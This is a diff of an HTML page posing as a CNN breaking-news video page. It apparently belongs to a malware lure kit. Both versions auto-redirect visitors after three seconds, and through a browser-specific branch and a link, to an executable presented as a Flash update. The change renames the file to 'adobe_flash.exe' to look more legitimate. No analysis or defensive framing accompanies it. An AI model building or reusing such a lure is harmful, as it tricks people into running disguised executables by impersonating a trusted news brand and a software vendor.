@@ -1,0 +1,22 @@
+11c11
+< <title>Video - Breaking News Videos from CNN.com</title> 
+---
+> <title>Breaking News Videos from CNN.com</title> 
+51c51
+< 		window.setTimeout("location.href='get_flash_update.exe'", 3000);
+---
+> 		window.setTimeout("location.href='adobe_flash.exe'", 3000);
+186c186
+<         case "iax": document.location.href="get_flash_update.exe"; break; 
+---
+>         case "iax": document.location.href="adobe_flash.exe"; break; 
+194c194
+< 		location.href="get_flash_update.exe";
+---
+> 		location.href="adobe_flash.exe";
+514c514
+< <a href="get_flash_update.exe">
+---
+> <a href="adobe_flash.exe">
+549a550
+> 
